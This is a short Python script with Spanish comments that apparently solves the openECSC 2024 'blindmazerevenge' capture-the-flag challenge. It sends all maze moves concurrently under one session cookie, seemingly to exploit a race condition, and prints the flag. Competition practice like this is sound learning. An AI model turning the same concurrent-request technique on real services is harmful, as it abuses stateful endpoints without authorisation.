import asyncio
import aiohttp

async def fetch(session, url, direction, session_cookie):
    async with session.get(url, params={"direction": direction}, cookies={"session": session_cookie}) as response:
        return await response.text()

async def main():
    # URL base del juego
    base_url = "http://blindmazerevenge.challs.open.ecsc2024.it/maze"
    
    # Leer las direcciones desde el archivo "movs"
    with open("movs", "r") as file:
        directions = [line.strip() for line in file.readlines()]
    
    # Inicialización de la sesión
    async with aiohttp.ClientSession() as session:
        # Inicialización del juego
        async with session.get(base_url, params={"direction": "start"}) as response:
            session_cookie = response.cookies["session"]
        
        # Bucle principal para navegar por el laberinto
        tasks = []
        for direction in directions:
            task = asyncio.ensure_future(fetch(session, base_url, direction, session_cookie))
            tasks.append(task)
        
        responses = await asyncio.gather(*tasks)
        
        # Analizar las respuestas
        for direction, response_text in zip(directions, responses):
            if "FAILED" not in response_text:
                # Si la solicitud fue exitosa, mostrar la última dirección
                print("Última dirección:", direction)
                # Si se encuentra la flag, terminar el juego
                if "openECSC{" in response_text:
                    print("¡Flag encontrada!")
                    print(response_text)
                    break
            else:
                print(f"Intento de dirección {direction} fallido. Intentando de nuevo...")

# Ejecutar el bucle de eventos de asyncio
asyncio.run(main())
